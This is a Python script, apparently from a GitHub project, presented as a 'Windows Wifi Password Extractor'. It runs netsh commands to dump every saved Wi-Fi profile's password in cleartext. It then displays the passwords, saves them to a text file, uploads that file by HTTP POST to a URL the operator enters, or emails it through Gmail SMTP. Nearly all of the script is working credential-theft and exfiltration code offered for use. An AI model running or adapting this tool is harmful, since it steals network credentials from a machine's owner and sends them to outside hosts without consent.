# !/usr/bin/python3
# Author:RobinHood
# Github:https://github.com/The-Robin-Hood

import subprocess
import re
import time
import os
import requests, getpass
import smtplib, ssl

def KeyboardInterruptError():  
    os.system('cls')
    if os.path.exists('WifiPasswd.txt'):
        os.remove('WifiPasswd.txt')
    print("\033[31m\nExiting \n\033[00m")
def error(): 
    os.system('cls')
    print("\033[31m\nSomething went wrong.Try again with proper information\033[00m")
    os.remove('WifiPasswd.txt')
def email():  
    port = 465  # For SSL
    smtp_server = "smtp.gmail.com"
    os.system('cls')
    print("\033[31mAttention !!\033[00m")
    Docs ='''
> To send mail through gmail follow the instruction
> First go to your Google Account and enable the 2-Step Verification.
> After that at the bottom, choose Select app and create a app.
> Follow the instructions, then you will be prompted with the App Password,the 16-character code.
> Copy it now use this as password here !!.'''
    print(Docs)
    sender_email =input("\033[31m\nRefer this for more info https://bit.ly/3Vpmuvp \n\n\033[00mType Sender gmail: ")
    password = getpass.getpass('Enter the Password :')  
    context = ssl.create_default_context()
    with open('WifiPasswd.txt', 'r') as file:
        message ="\n"+file.read()
    try:
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            receiver_email =input("Type Reciever Email: ") 
            server.sendmail(sender_email, receiver_email, message)
        print("\033[92m\nSent to the mail\n\033[00m")
        os.remove("WifiPasswd.txt")
    except smtplib.SMTPAuthenticationError:
        os.system("cls")
        banner()
        print("\033[31m\nWrong Username or Password\n\033[00m")
        email()
    except:
        error()
        
def showit(): 
    if not password:
        print("\033[92mSSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":None\n\033[0m")
    else:
        print("\033[92mSSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":{}\n\033[0m".format(password[0]))
def savetxt(): 
    with open("WifiPasswd.txt", 'a') as f:
        if not password:
            f.write("SSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":None\n\n")
        else:
            f.write("SSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":{}\n\n".format(password[0]))
def PostWebserver(): 
    url = input("Enter the url(Eg:http://example.com/upload.php): ")
    if url=='':
        os.system('cls')
        print("\033[31m Invalid URL\033[00m")
        PostWebserver()
    else:
     with open("WifiPasswd.txt", 'rb') as f:
        r = requests.post(url, files={'uploaded_file': (f)})
        if r.status_code == 200:
            print("\033[92mUploaded Successfully\033[0m")
def main(): 
    global password,x
    try:
        Ask = input("Choose the Options:\n   1.Show\n   2.SaveTxt\n   3.Post To Webserver\n   4.Send Mail\n   5.Exit\n>> ")
        cmd_profile = subprocess.getoutput("netsh wlan show profiles")
        profile = re.findall('All User Profile     : (.*)', cmd_profile)
        for x in profile:
            cmd_passwd = subprocess.getoutput("netsh wlan show profile {} key=clear".format(x))
            password = re.findall("Key Content            : (.*)", cmd_passwd)
            if (Ask == '1'):
                showit()
            elif Ask in ['2','3','4']:
                savetxt() 
            elif (Ask == '5'):
                print("\n\033[92m Bye Bye !!! \n\033[00m")
                exit()
            else:
                os.system('cls')
                print("\033[31m Invalid Option\033[00m")
                time.sleep(1)
                banner()
                main()
                exit()
        if Ask == '3':
                try:
                    PostWebserver()
                except KeyboardInterrupt:
                    KeyboardInterruptError()
                except:
                    error()
        if Ask == '2':
            print("\033[92m\nSaved as WifiPasswd.txt\n\033[00m")
        if Ask == '4':
            try:
                email()
            except KeyboardInterrupt:
                KeyboardInterruptError()
            except:
                error()
        time.sleep(2)


    except KeyboardInterrupt:
        KeyboardInterruptError()
def banner ():
    print(""" \033[31m

888       888 888       888 8888888b.  8888888888 
888   o   888 888   o   888 888   Y88b 888        
888  d8b  888 888  d8b  888 888    888 888        
888 d888b 888 888 d888b 888 888   d88P 8888888    
888d88888b888 888d88888b888 8888888P"  888        
88888P Y88888 88888P Y88888 888        888        
8888P   Y8888 8888P   Y8888 888        888        
888P     Y888 888P     Y888 888        8888888888 
\033[36m                                                  
    (Windows Wifi Password Extractor)                                                  
           Author:Robinhood
 Github: https://github.com/The-Robin-Hood                                             

\033[00m""")


os.system("cls") 
banner()
main()
